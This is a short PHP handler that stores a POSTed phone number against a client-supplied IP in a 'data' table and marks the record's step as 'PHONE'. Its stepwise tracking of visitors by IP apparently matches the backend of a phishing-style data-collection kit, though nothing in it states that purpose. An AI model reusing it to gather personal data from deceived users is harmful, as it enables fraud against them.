<?php

if( $_POST ) {

    include_once '../app.php';
    $db = new MysqliDb ($db_infos['host'], $db_infos['db_user'], $db_infos['db_pass'], $db_infos['database_name']);

    $phone = $_POST['phone'];
    $ip  = $_POST['ip'];

    $data = [
        'phone'   => $phone,
        'ip'    => $ip,
        'step'  => 'PHONE'
    ];

    $db->where ('ip', $ip);
    $db->update ('data', $data);

    $db->disconnect();

}

?>